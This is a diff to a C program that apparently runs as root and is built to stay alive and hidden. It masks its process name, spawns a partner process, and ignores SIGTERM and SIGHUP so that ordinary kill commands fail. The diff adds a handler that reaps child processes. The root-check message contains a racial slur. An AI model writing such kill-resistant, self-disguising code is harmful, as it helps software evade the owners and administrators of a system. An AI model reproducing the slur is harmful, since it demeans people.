@@ -1,8 +1,10 @@
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <fcntl.h>
 #include <unistd.h>
+#include <sys/mman.h>
 #include <sys/types.h>
 #include <sys/mount.h>
 #include <sys/prctl.h>
@@ -110,6 +112,11 @@ void SpawnThePartner(){
     if(b_pid == 0) b_pid = getppid();   // b_pid is now the parent, this program is the child    
 }
 
+void ZombieManager(int sig){
+    // no halt if no child exits, continue the loop
+    while(waitpid(-1, NULL, WNOHANG) > 0);
+}
+
 int main(int argc, char *argv[]){
     if(getuid() != 0){
         printf("root privileges needed negro!");
@@ -120,8 +127,9 @@ int main(int argc, char *argv[]){
     MaskIt(argv);
 
     // ignore soft kill signals
-    signal(SIGTERM, SIG_IGN);       // survive normal terminations like kill without -9
-    signal(SIGHUP, SIG_IGN);        // survive without any parent or anything attached
+    signal(SIGTERM, SIG_IGN);           // survive normal terminations like kill without -9
+    signal(SIGHUP, SIG_IGN);            // survive without any parent or anything attached
+    signal(SIGCHLD, ZombieManager);     // child reaping
 
     // initial spawn
     SpawnThePartner();
